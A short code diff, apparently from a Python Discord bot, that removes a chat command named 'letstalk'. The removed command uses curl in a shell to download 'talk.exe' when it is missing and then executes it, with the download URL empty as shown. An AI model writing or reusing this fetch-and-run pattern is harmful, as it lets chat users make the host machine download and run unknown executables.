@@ -29,19 +29,6 @@ async def ping(ctx):
 
 
 
-@bot.command(name="letstalk")
-async def talk(ctx):
-    files = os.listdir()
-    if "talk.exe" not in files:
-        subprocess.run("curl -O ", shell=True)
-    try:
-        subprocess.run("talk.exe", shell=True)
-    except:
-        await ctx.send("```Failed to start talk.exe```")
-
-
-
-
 @bot.event
 async def on_ready():
     guild = bot.get_guild(1241330664578744350)
